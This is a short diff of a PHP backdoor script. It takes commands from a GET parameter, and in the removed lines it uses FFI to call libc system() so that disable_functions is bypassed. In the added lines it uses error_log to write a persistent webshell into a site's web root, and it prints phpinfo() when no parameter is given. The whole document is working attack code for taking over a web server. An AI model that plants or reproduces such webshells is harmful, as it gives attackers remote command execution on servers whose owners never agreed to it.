@@ -1,9 +1,9 @@
- <?php
+  <?php
   if(isset($_GET['x'])){
       $cmd = $_GET['x'];
-      // FFI bypass disable_functions (PHP 8.2)
-      $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
-      $ffi->system($cmd." 2>&1");
+      // Write a webshell using error_log (not disabled)
+      error_log('<?php system($_GET["c"]); ?>', 3, '/www/wwwroot/xlch49.pics/sh.php');
+      echo "webshell written to sh.php";
   } else {
       phpinfo();
   }
